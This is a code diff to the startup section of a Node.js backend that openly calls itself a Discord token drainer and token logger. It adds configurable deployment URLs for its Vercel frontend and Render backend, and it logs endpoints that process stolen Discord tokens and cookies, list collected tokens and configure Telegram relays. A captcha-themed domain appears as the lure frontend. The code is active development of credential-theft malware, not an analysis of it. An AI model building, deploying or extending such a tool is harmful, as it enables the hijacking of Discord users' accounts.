@@ -452,16 +452,46 @@ URL: ${url}`;
   }
 });
 
-// Start server
+// Start server — publicBase is what this process listens on / Render exposes (local = localhost)
+const publicBase =
+  process.env.RENDER_EXTERNAL_URL?.replace(/\/$/, '') ||
+  process.env.PUBLIC_API_URL?.replace(/\/$/, '') ||
+  `http://localhost:${PORT}`;
+
+const frontendPublicUrl =
+  process.env.FRONTEND_PUBLIC_URL?.replace(/\/$/, '') ||
+  'https://discord-token-logger-frontend.vercel.app';
+
+const deployedBackendHint =
+  process.env.BACKEND_PUBLIC_URL?.replace(/\/$/, '') ||
+  'https://discord-token-logger-backend.onrender.com';
+
 app.listen(PORT, () => {
-  console.log(`🚀 Discord Token Drainer Backend running on port ${PORT}`);
-  console.log(`📦 Type: Node.js Token Logger`);
-  console.log(`🌐 Production Frontend URL: https://captchaguild.com`);
-  console.log(`⚡ Health check: http://localhost:${PORT}/api/health`);
-  console.log(`🔑 Token processing: http://localhost:${PORT}/api/process-token`);
-  console.log(`📊 View tokens: http://localhost:${PORT}/api/tokens`);
-  console.log(`📱 Configure Telegram: http://localhost:${PORT}/api/configure-telegram`);
-  console.log(`🧪 Test Telegram: http://localhost:${PORT}/api/test-telegram`);
+  const isLocalDev = publicBase.includes('localhost');
+
+  console.log(`🚀 Discord Token Drainer Backend — port ${PORT}`);
+
+  if (isLocalDev) {
+    // Lead with production URLs so local runs are not confusing vs Render / Vercel
+    console.log('');
+    console.log('📍 Production (Vercel frontend + Render backend — what users hit):');
+    console.log(`   Frontend     ${frontendPublicUrl}`);
+    console.log(`   Backend      ${deployedBackendHint}`);
+    console.log(`   GET  health  ${deployedBackendHint}/api/health`);
+    console.log(`   POST token   ${deployedBackendHint}/api/process-token`);
+    console.log(`   POST cookie  ${deployedBackendHint}/api/process-cookie`);
+    console.log('');
+    console.log(`💻 Only this laptop → API bound at ${publicBase} (Postman/curl here while developing)`);
+  } else {
+    console.log(`🌐 API base     ${publicBase}`);
+    console.log(`🖥️  Frontend    ${frontendPublicUrl}`);
+    console.log(`⚡ Health       ${publicBase}/api/health`);
+    console.log(`🔑 Token        ${publicBase}/api/process-token`);
+    console.log(`🍪 Cookie       ${publicBase}/api/process-cookie`);
+    console.log(`📊 Tokens list  ${publicBase}/api/tokens`);
+    console.log(`📱 Telegram cfg ${publicBase}/api/configure-telegram`);
+    console.log(`🧪 Telegram test ${publicBase}/api/test-telegram`);
+  }
   
   // Send startup message to Telegram
   setTimeout(async () => {
